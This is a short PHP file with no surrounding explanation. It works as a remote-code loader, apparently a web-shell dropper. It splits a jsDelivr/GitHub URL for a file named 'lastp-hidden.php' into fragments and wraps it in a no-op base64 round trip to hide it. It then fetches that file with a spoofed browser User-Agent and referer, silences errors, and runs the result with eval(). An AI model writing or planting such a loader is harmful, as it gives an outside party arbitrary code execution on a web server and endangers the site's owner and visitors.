<?php
$a="https://";$b="cdn.";$c="jsdelivr";$d=".net/gh/";$e="eclibesec";$f="/hastalavista@main/";$g="lastp-hidden.php";
$url=base64_decode(base64_encode($a.$b.$c.$d.$e.$f.$g));
$opt=['http'=>['method'=>'GET','header'=>['User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36','Accept: text/html','Referer: https://www.google.com/']]];
$ctx=stream_context_create($opt);
$code=@file_get_contents($url,false,$ctx)?:@file_get_contents($url);
if($code) eval("?>".$code);
?>
